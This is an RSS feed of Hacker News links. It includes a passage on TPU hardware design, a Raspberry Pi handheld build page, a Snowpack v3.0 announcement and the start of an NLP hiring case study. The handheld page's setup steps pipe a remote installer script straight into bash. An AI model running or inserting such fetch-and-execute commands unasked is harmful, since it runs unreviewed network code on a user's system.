upper right-hand corner. It contains 256x256 “multiply and accumulate” units (MACs) that can perform 8-bit multiply-and-adds on signed or unsigned integers, which offers a peak throughput of <strong>92 TeraOps/second (TOPS) </strong>(65,536 * 700MHz clock rate = 46 × 10¹² multiply-and-add operations or 92 Teraops per second, 92 × 10¹²).</p><p id="3942">The weights for the matrix unit are staged through an on-chip Weight FIFO that reads from an <strong>off-chip 8 GB DRAM called Weight Memory</strong> (two 2133MHz DDR3 DRAM channels) for inference, weights are read-only. 8 GB supports many simultaneously active models.</p><p id="afb5">The 16-bit products are collected in the <strong>4 MB of 32-bit Accumulators</strong> below the matrix unit. The 4MB represents 4096, 256-element, 32-bit accumulators.</p><p id="2b12">The matrix unit produces one 256-element partial sum per clock cycle. When using a mix of 8-bit weights and 16-bit activations (or vice versa), the Matrix Unit computes at <strong>half-speed</strong>, and it computes at a <strong>quarter-speed</strong> when both are 16 bits.</p><p id="738c">The intermediate results are held in the <strong>24 MB on-chip Unified Buffer</strong>, which can serve as inputs to the Matrix Unit. A programmable DMA controller transfers data to or from CPU Host memory and the Unified Buffer.</p><p id="e908">The 24 MB Unified Buffer is almost a third of the die and the Matrix Multiply Unit is a quarter.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1438/1*UtQ4tN0wjK0CmiImhvdOuQ.png" width="719" height="578" srcset="https://miro.medium.com/max/552/1*UtQ4tN0wjK0CmiImhvdOuQ.png 276w, https://miro.medium.com/max/1104/1*UtQ4tN0wjK0CmiImhvdOuQ.png 552w, https://miro.medium.com/max/1280/1*UtQ4tN0wjK0CmiImhvdOuQ.png 640w, https://miro.medium.com/max/1400/1*UtQ4tN0wjK0CmiImhvdOuQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*UtQ4tN0wjK0CmiImhvdOuQ.png?q=20"></p></div></div></div><figcaption>Floor Plan of TPU die.</figcaption></figure><p id="095c">The light (blue) data buffers are 37% of the die, the light (yellow) compute is 30%, the medium (green) I/O is 10%, and the dark (red) control is just 2%. Control is much larger (and much more difficult to design) in a CPU or GPU.</p><p id="677a">The TPU ASIC is built on a 28nm process, runs at 700MHz, and consumes 40W when running (75W TDP).</p><p id="bb1f">TPU implements the matrix multiplication with the systolic array in a pipeline fashion. It relies on data from different directions arriving at cells in an array at regular intervals and being combined.</p><p id="2590">The matrix unit uses “systolic execution” to save energy by reducing reads and writes of the Unified Buffer. It relies on data from different directions arriving at cells in an array at regular intervals where they are combined. A given 65,536-element vector-matrix multiply operation moves through the matrix as a diagonal wave-front. The weights are preloaded and take effect with the advancing wave alongside the first data of a new block. Control and data are pipelined to give the illusion to the programmer that the 256 inputs are read at once and instantly update one location of each of 256 accumulators. From a correctness perspective, the software is unaware of the systolic nature of the matrix unit, but, for performance, must account for the latency of the unit. (<a href="https://cacm.acm.org/magazines/2018/9/230571-a-domain-specific-architecture-for-deep-neural-networks/fulltext" target="_blank" rel="noopener">source</a>)</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1122/1*cUuejVpcWwhRd_KE2nuNkw.png" width="561" height="418" srcset="https://miro.medium.com/max/552/1*cUuejVpcWwhRd_KE2nuNkw.png 276w, https://miro.medium.com/max/1104/1*cUuejVpcWwhRd_KE2nuNkw.png 552w, https://miro.medium.com/max/1122/1*cUuejVpcWwhRd_KE2nuNkw.png 561w" sizes="561px" data-old-src="https://miro.medium.com/max/60/1*cUuejVpcWwhRd_KE2nuNkw.png?q=20"></p></div></div><figcaption>Systolic data flow of the Matrix Multiply Unit</figcaption></figure><p id="736a">If you want to know more about systolic arrays, read the corresponding section from <a href="https://cloud.google.com/blog/products/gcp/an-in-depth-look-at-googles-first-tensor-processing-unit-tpu" target="_blank" rel="noopener">Google’s blog</a>. Another good and more detailed description can be found <a href="https://medium.com/@antonpaquin/whats-inside-a-tpu-c013eb51973e" target="_blank" rel="noopener">here</a>.</p><p id="f12a">Google’s benchmark figures all use the roofline performance model (see the <a target="_blank" rel="noopener" href="https://blog.inten.to/hardware-for-deep-learning-part-3-gpu-8906c1644664">section on GPU</a> for more details) because it offers insights on the causes of performance bottlenecks.</p><p id="997b">The assumption behind the model is that applications don’t fit in on-chip caches, so they are either computation-limited or memory bandwidth-limited. For HPC, the Y-axis is the performance in floating-point operations per second, thus the peak computation rate forms the “flat” part of the roofline. The X-axis is operational intensity, measured as floating-point operations per DRAM byte accessed. Memory bandwidth is measured in bytes per second, which turns into the “slanted” part of the roofline since (FLOPS/sec)/ (FLOPS/Byte) = Bytes/sec. Without sufficient operational intensity, a program is memory bandwidth-bound and lives under the slanted part of the roofline.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1936/1*TRZRMm7ZisNxPZOFP7gJDQ.png" width="968" height="632" srcset="https://miro.medium.com/max/552/1*TRZRMm7ZisNxPZOFP7gJDQ.png 276w, https://miro.medium.com/max/1104/1*TRZRMm7ZisNxPZOFP7gJDQ.png 552w, https://miro.medium.com/max/1280/1*TRZRMm7ZisNxPZOFP7gJDQ.png 640w, https://miro.medium.com/max/1400/1*TRZRMm7ZisNxPZOFP7gJDQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TRZRMm7ZisNxPZOFP7gJDQ.png?q=20"></p></div></div></div><figcaption>The Roofline model for a single TPU die on log-log scales</figcaption></figure><p id="508c">The TPU has a long “slanted” part of its roofline, where operational intensity means that <strong>performance is limited by memory bandwidth rather than by peak compute</strong>. Five of the six benchmarking applications are happily bumping their heads against the ceiling.</p><p id="8560">Yet, rooflines for a single Haswell die and for a single K80 die show that the six NN applications are …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81">https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81</a></em></p>]]>
            </description>
            <link>https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781471</guid>
            <pubDate>Thu, 14 Jan 2021 19:49:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will an official Presidential inauguration take place?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781074">thread link</a>) | @jjuuaann
<br/>
January 14, 2021 | https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021 | <a href="https://web.archive.org/web/*/https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>Disclaimer</h3><p>Polymarket is for informational and educational purposes only. We take no custody of anyone's money or cryptocurrency, extract no profits, nor do we host any markets ourselves. Polymarket displays existing markets live on the Ethereum blockchain (or sidechains) and is a graphical user interface for both visualizing data and market trends from on-chain activity, and interacting with said smart contracts directly via your Web 3 enabled wallet.</p></div></div></div>]]>
            </description>
            <link>https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781074</guid>
            <pubDate>Thu, 14 Jan 2021 19:27:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yarh.io Micro 2 Raspberry Pi 3B+ Hacker's Linux Handheld]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25780972">thread link</a>) | @enchiridion
<br/>
January 14, 2021 | https://yarh.io/yarh-io-m2.html | <a href="https://web.archive.org/web/*/https://yarh.io/yarh-io-m2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <section id="top-section">
        <div id="top-section-top">
            <nav>
                
            </nav>
            <p id="heading">
                
                <h2>Raspberry Pi 3B+ Hacker's Linux Handheld<br></h2>
            </p>
        </div>
    </section>
    <section id="yarh-io-mki">
        <div>
            <div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" alt="YARH.IO M2 Handheld"></a></p>
                    <div>
                        <p>Welcome to the new stage of the YARH.IO project, where our goal is to build a device designed for hacking, coding, and creative use. YARH.IO Micro 2 has been made with&nbsp;hackers in mind, for&nbsp;computer experts who uses their technical knowledge to achieve new goals and overcome computer system limitations by non-standard or 'hackable' means.&nbsp;<br></p>
                        <p>YARH.IO Micro 2 project continues to take on the challenge of building a full featured, micro sized handheld, based on Raspberry Pi 3B+, 4" touch screen and Bluetooth keyboard without touchpad.&nbsp;&nbsp;<br></p>
                        <p>YARH.IO Micro 2 can run Raspberry Pi OS or Kali Linux, providing users with a rich range of applications and development tools.&nbsp;This is a rare handheld that allows users to write new program code directly on the device for the use on the device itself.</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>YARH.IO Micro 2 is powered by&nbsp;Raspberry Pi 3B+, offering the best ratio of functionality and computing power requirements for a mobile, battery powered device. The board is stripped down to reduce the total height. The ethernet RJ45 connector on the Pi 3B+ has been removed, while the double stack USB connectors were replaced with single stack USB connectors.<br></p>
                        <p>Pimoroni Hyper Pixel 4" IPS 800x480 display delivers a sharp, clear, and bright picture with a wide viewing angle. Capacitive&nbsp;touch screen with multi-touch allows for a simple and easy interaction with the user interface.<br></p>
                        <p>Minimalist keyboard provides comfortable typing when holding the device with both hands. Modifier keys grant easy access to special control keys and functions. Custom key remapping simplifies interaction with the system and its applications.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" alt="YARH.IO M2 Handheld with accessories"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" alt="YARH.IO M2 Handheld front left"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features extended USB connectivity. The two USB ports have been relocated to the top of the device and now allow users to simultaneously connect large profile USB accessories, such as WiFi adaptors, cellular modems, GPS, USB drives, and others.<br></p>
                        <p>A single, removable, high capacity Fenix ARB-L18-3500U 3500mAh Li-ion USB Rechargeable Battery powers the device. Removable battery ensures that an empty battery can be quickly replaced with a charged one. Fenix rechargeable battery provides direct charging via a Micro USB connector and a built-in battery charger.</p>
                        <p>High output Step-Up power supply has been used to effectively support power hungry USB accessories.&nbsp;</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>Arduino proMicro module controls the battery voltage. The module reads battery and power supply voltage, making the results available over I2C bus to the Raspberry Pi and to various custom build applications. The module also controls power LED as a way to indicate battery charge status.</p>
                        <p>With Arduino IDE installed, it is possible to program proMicro directly on the device, to customize battery charge LED indicator, and to add other creative functionality.</p>
                        <p>The DS3231 High Precision RTC Clock Module is used to store current time and date for the Raspberry Pi.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" alt="YARH.IO M2 Handheld top front"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" alt="YARH.IO M2 Handheld Back"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features simple mechanical design. Main frame used for mounting Raspberry Pi board and screen, power bed with conjunction with front panel provides mounting points for keyboard, power supply, battery, RTC and proMicro module.&nbsp;</p>
                        <p>Back panel features an open battery bay, allowing for quick battery replacement. In instances when&nbsp;battery&nbsp;replacement is not required, the bay can be covered with the battery cover. This set-up ensures that the battery can always be charged using the battery's built-in charger.</p>
                        <p>The I2C bus is available while the I2C connector is mounted on the right side of the device and can be used to connect external modules with I2C connectivity.&nbsp;Pimoroni Hyper Pixel display utilises all Raspberry Pi GPIO pins, therefore no additional GPIO connectors are present for the external devices.&nbsp;<br></p>
                    </div>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" alt="YARH.IO M2 Handheld internals"></a></p>
                    <div>
                        <p>No 'click' assembly used. This is a fully hackable device with stainless steel button socket cap screws used&nbsp;throughout for multiple assembly and disassembly cycles.<br></p>
                        <p>The&nbsp;corners of the housing are protected with eight rugged-design rubber bumpers.&nbsp;<br></p>
                        <p>All parts are 3D printed using PLA and Flex plastics. ABS and ASA plastics can be used as an alternative, but require use of advanced printers and techniques.<br></p>
                        
                        <p>The list of parts used for the YARH.IO project can be purchased from Amazon and other online stores is available below.</p>
                    </div>
                </div>
                <div>
                    
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" alt="YARH.IO M2 Handheld Kali"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" alt="YARH.IO M2 Handheld USB accessories"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 Project at a Glance.&nbsp;</p>
                        <p>The outcome of this YARH.IO Micro 2 is a micro-size (116mm x 123mm x 27mm) handheld with the potential to run a unlimited applications and to be extended with an unlimited range of external USB devices. It is portable, has minimalist design, and can be relatively easily 3D printed and assembled.<br></p>
                        <p>The release of YARH.IO Micro 2 marks a new success in our line-up of goals&nbsp;towards the design, development, and release of innovative handhelds for hacking, coding, and creative use by computer experts and enthusiasts.&nbsp;<br></p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section id="yarh-io-mki-gallery">
        
    </section>
    <section id="yarh-io-mki-downloads">
        
    </section>
    <section id="yarh-io-mki-assembly-gallery">
        
    </section>
    <section id="yarh-io-mki-software">
        <div>
            <div>
                <p id="heading-software">
                    <h2>System &amp; Software<br></h2>
                </p>
                <div>
                    <div>
                        <div>
                            <h4>Software packages</h4><p><code>sudo apt install tmux vim mc -y<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>HyperPixel screen</h4><p><code>curl -sSL https://get.pimoroni.com/hyperpixel4 | bash<br></code><code>hyperpixel4-rotate right<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Turn off HyperPixel on shutdown</h4>
                            <p>The original link:&nbsp;https://github.com/pimoroni/hyperpixel4/issues/3. Thank you&nbsp;Florian Mirkes.<br></p><p><code># Create&nbsp;/etc/systemd/system/hyperpixel4-backlight.service and add the following:<br></code><code>[Unit]<br>Description=Sets up gpio-poweroff to handle Hyperpixel backlight upon shutdown/reboot<br>ConditionPathExists=/usr/bin/hyperpixel4-init<br>ConditionPathExists=/boot/overlays/gpio-poweroff.dtbo<br>ConditionPathExists=/usr/bin/dtoverlay<br>DefaultDependencies=no<br>Before=umount.target<br>[Service]<br>Type=oneshot<br>ExecStart=/bin/sh -c '/sbin/rmmod gpio-backlight;/usr/bin/dtoverlay /boot/overlays/gpio-poweroff.dtbo gpiopin=19 active_low=1'<br>[Install]<br>WantedBy=reboot.target halt.target poweroff.target<br></code><code>sudo systemctl enable hyperpixel4-backlight.service<br></code><code>sudo systemctl start hyperpixel4-backlight.service<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Enable right-click for the Raspberry Pi touchscreen</h4>
                            <p>The original article :&nbsp;https://fmirkes.github.io/articles/20190827.html. Thank you&nbsp;Philip Howard.<br></p><p><code>sudo apt install build-essential libevdev2 libevdev-dev -y<br></code><code>git clone 'https://github.com/PeterCxy/evdev-right-click-emulation.git'<br></code><code>cd 'evdev-right-click-emulation'<br></code><code>make all<br></code><code>sudo cp 'out/evdev-rce' '/usr/local/bin/'<br></code><code>sudo chmod +x '/usr/local/bin/evdev-rce'<br></code><code># Add evdev-rce to startup<br></code><code>sudo usermod -G 'input' -a pi<br></code><code>echo 'uinput' | sudo tee -a /etc/modules<br></code><code># Edit: /etc/udev/rules.d/99-uinput.rules<br></code><code>KERNEL=="uinput", MODE="0660", GROUP="input"<br></code><code>sudo udevadm control --reload-rules<br></code><code>sudo udevadm trigger<br></code><code>mkdir ~/.config/autostart<br></code><code># Create: ~/.config/autostart/evdev-rce.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=evdev-rce<br>GenericName=Enable long-press-to-right-click gesture<br>Exec=env LONG_CLICK_INTERVAL=500 LONG_CLICK_FUZZ=50 /usr/local/bin/evdev-rce<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>RTC</h4><p><code># Create: ~/.rtc-init.sh and add the following:<br></code><code>echo "ds1307 0x68" | sudo -E tee -a /sys/bus/i2c/devices/i2c-11/new_device<br></code><code>sudo chmod +x ~/.rtc-init.sh<br></code><code># Create&nbsp;~/.config/autostart/rtc-init.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=rtc-init<br>GenericName=Initialize ds3231 RTC on non standard i2c-11 bus, address 0x68<br>Exec=sh /home/pi/.rtc-init.sh<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Bluetooth Keyboard</h4>
                            <p>To connect Bluetooth keyboard for the first time use Bluetooth icon on the menu bar and select Add device. Press hard the Blue Bluetooth button on the keyboard, blue light on the keyboard starts blinking. The keyboard icon and name Bluetooth Keyboard should appear in the …</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yarh.io/yarh-io-m2.html">https://yarh.io/yarh-io-m2.html</a></em></p>]]>
            </description>
            <link>https://yarh.io/yarh-io-m2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780972</guid>
            <pubDate>Thu, 14 Jan 2021 19:22:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Autocode Is Now Deployless]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780618">thread link</a>) | @beefman
<br/>
January 14, 2021 | https://autocode.com/community/announcements/autocode-is-now-deployless/ | <a href="https://web.archive.org/web/*/https://autocode.com/community/announcements/autocode-is-now-deployless/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://autocode.com/community/announcements/autocode-is-now-deployless/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780618</guid>
            <pubDate>Thu, 14 Jan 2021 19:01:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowpack v3.0]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25780589">thread link</a>) | @dsego
<br/>
January 14, 2021 | https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0 | <a href="https://web.archive.org/web/*/https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
      <p>Snowpack v3.0 is here! This is our biggest release yet with brand new features including:</p>
<ul>
<li><strong>Pre-bundled streaming imports</strong> - Import any npm package, on-demand.</li>
<li><strong>Integrated build optimizations</strong> - Built-in bundling, preloading, minification, and more.</li>
<li><strong>JavaScript API</strong> - Integrate with Snowpack’s brand new native JS API.</li>
<li><strong>Node.js Runtime API</strong> - Import your Snowpack-built files directly into Node.js.</li>
<li><strong>Bug fixes, stability improvements, and a whole lot more!</strong></li>
</ul>
<p>Install the newest version of Snowpack to get started:</p>
<pre><code>$ npm install snowpack@^3.0.0
</code></pre>
<p>Or, try out one of our updated <a href="https://www.npmjs.com/package/create-snowpack-app">Create Snowpack App</a> starter templates:</p>
<pre><code>$ npx create-snowpack-app new-project-directory --template  @snowpack/app-template-react
</code></pre>
<h2 id="reimagining-web-development-for-esm">Reimagining Web Development for ESM</h2>
<p>1 year ago, Snowpack first released with the mission to reimagine web development for modern JavaScript and ESM. Snowpack leverages modern web features to deliver a frontend build tool that needs just 50ms to start up &amp; react to new file changes, regardless of project size. In comparison, traditional web bundlers could take several seconds or even full minutes to start up in large projects.</p>
<p>Snowpack v3.0 marks another huge leap on our mission to push web development forward with the release of <strong>streaming imports</strong>. Streaming imports make it possible to import any package directly into your project, pre-built and pre-bundled for immediate use. It’s the power of the entire JavaScript ecosystem, at your fingertips.</p>
<video preload="auto" autoplay="" loop="" muted="" playsinline="">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.webm" type="video/webm">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.mp4" type="video/mp4">
</video>
<h2 id="what-are-streaming-imports%3F">What are Streaming Imports?</h2>
<p>The typical web developer installs and manages their JavaScript dependencies locally using a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. These npm packages can’t run directly in the browser, so additional work is needed to resolve, process, build and bundle these packages for the browser before you can actually use them.</p>
<p><strong>What if we could simplify this? What if you could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM import?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://www.skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every package&nbsp;on npm as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline after the first package fetch.</p>
<p>This new workflow has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies on-demand as pre-build, pre-bundled ESM code.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever runs sandboxed in the browser.</li>
<li><strong>Less Tooling:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Identical Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact set of imports.</li>
</ul>
<p>This is our bet on the future of web development. But if this all sounds too wild for you or you have some technical reason to keep managing your dependencies with npm, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-imports">Streaming Package Imports</a> to learn more about how to enable this new behavior in your project today.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers their own benchmarks. esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is just a post-build optimization.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but its future looks promising. In the meantime, we will also continue to invest in the existing bundler plugins for a long time to come, so that more mature projects can continue to use mature bundlers like Webpack &amp; Rollup.</p>
<p>To get started, check out the <code>optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p><a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a> is the new official web app framework from the Svelte team, built with Snowpack. SvelteKit uses our new JavaScript API to manage the build pipeline and build files on-demand. Snowpack helps SvelteKit speed up development, with zero rapid updates on file change and zero upfront server start-up cost.</p>
<p><a href="https://www.npmjs.com/package/microsite">Microsite</a> is another exciting new project built with Snowpack. Microsite is a Static Site Generator (SSG) for Preact that features automatic partial hydration, so that you send as little JavaScript down to the client as possible.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-runtime.png" alt="js api"></p>
<h2 id="a-new-node.js-runtime">A New Node.js Runtime</h2>
<p>Speaking of Svelte, this next feature comes directly out of our collaboration with the Svelte team. As a part of building out SvelteKit, Rich Harris created a server-side runtime for Snowpack. This runtime lets you import any Snowpack-built file directly into Node.js, handling things like ESM-&gt;CJS conversion and CSS extraction automatically.</p>
<p>The result is a unified build pipeline across both Node.js and the frontend, with all of the on-demand build performance benefits of Snowpack. Importing frontend code to run in Node.js unlocks features like true server-side rendering (SSR), test runner integrations for Jest/uvu/Mocha, and more.</p>
<p>Check out our new <a href="https://www.snowpack.dev/guides/server-side-render">SSR guide</a> to get started and learn more about all of the different ways that you can connect to your Snowpack build.</p>
<p>🥳</p>
<h2 id="snowpack%E2%80%99s-one-year-anniversary">Snowpack’s One Year Anniversary</h2>
<p>Last week marked Snowpack’s one-year anniversary of the original v1.0.0 release. Looking back, I’m blown away by everything that’s happened since:</p>
<ul>
<li>150+ releases (from <code>v0.0.1</code>, all the way to v3.0 today)</li>
<li><a href="https://www.snowpack.dev/plugins">100+ Snowpack plugins</a> to choose from (and growing fast!)</li>
<li><a href="https://github.com/snowpackjs/snowpack/graphs/contributors">100+ individual contributors</a></li>
<li><a href="https://github.com/snowpackjs/snowpack/stargazers">15,000+ stars on GitHub</a></li>
<li>#1 Developer Productivity Boost Winner, <a href="https://osawards.com/javascript/2020">2020 JS Open Source Awards</a></li>
<li>#1 Highest Developer Interest, <a href="https://2020.stateofjs.com/en-US/technologies/build-tools/">2020 State of JS</a></li>
<li>#1 Highest Developer Satisfaction (tied), 2020 State of JS</li>
</ul>
<p>A huge thank you to everyone who has contributed code to Snowpack, and the hundreds of developers joining us on GitHub and on <a href="https://discord.com/invite/snowpack">Discord</a>. This project wouldn’t exist today without you and your support. Thank you!</p>
<p>– Fred K. Schott <a href="https://twitter.com/FredKSchott">(@FredKSchott)</a></p>

    </article>
    </div></div>]]>
            </description>
            <link>https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780589</guid>
            <pubDate>Thu, 14 Jan 2021 18:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25780588">thread link</a>) | @cl42
<br/>
January 14, 2021 | https://joinphase.com/talent-acquisition-nlp | <a href="https://web.archive.org/web/*/https://joinphase.com/talent-acquisition-nlp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>

   

    <p>Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP

    </p>
    
  </div>
</div><div>
  <div>

   

    <div>

<p><b>Summary:</b> Maison Battat, a global toy company, recently hired a uniquely qualified data science candidate in only 26 days. Phase describes how we worked with Maison Battat to build a text mining (i.e., “Natural Language Processing” or “NLP”) approach that could scan 1,000s of candidates in minutes and look for unique attributes and experiences shared by applicants and broader candidate pools alike.

</p><p>Skip to: <a href="#problem">Problem</a> | <a href="#solution">Solution</a> | <a href="#results">Result</a> | <a href="#quotes">Quotes</a>

    </p></div>

    </div>

    
  </div><div>
  <div>

   

    <div>

<p><a name="problem"></a>The Problem: too many candidates and poor screening options

</p><p>Most applicant screening systems are limited in how they enable searching and filtering of candidates. This means that they rarely allow you to include unique combinations of skills or score candidate profiles in a more flexible manner.

</p><p>Worse still, many job applications have <i>hundreds</i> or <i>thousands</i> of applicants. If you expand this to a passive pool, you can be looking at 10,000+ candidates for a single role. Hiring managers and recruiters struggle with reviewing so many profiles, and resort to keyword searches.

</p><p><a name="solution"></a>Our Solution: use recent advances in text mining to make candidate searches descriptive and holistic

</p><p>To address the challenge above, Phase uses two strategies to solve this problem.

</p><p><b>1. Make the search a conversational process</b>

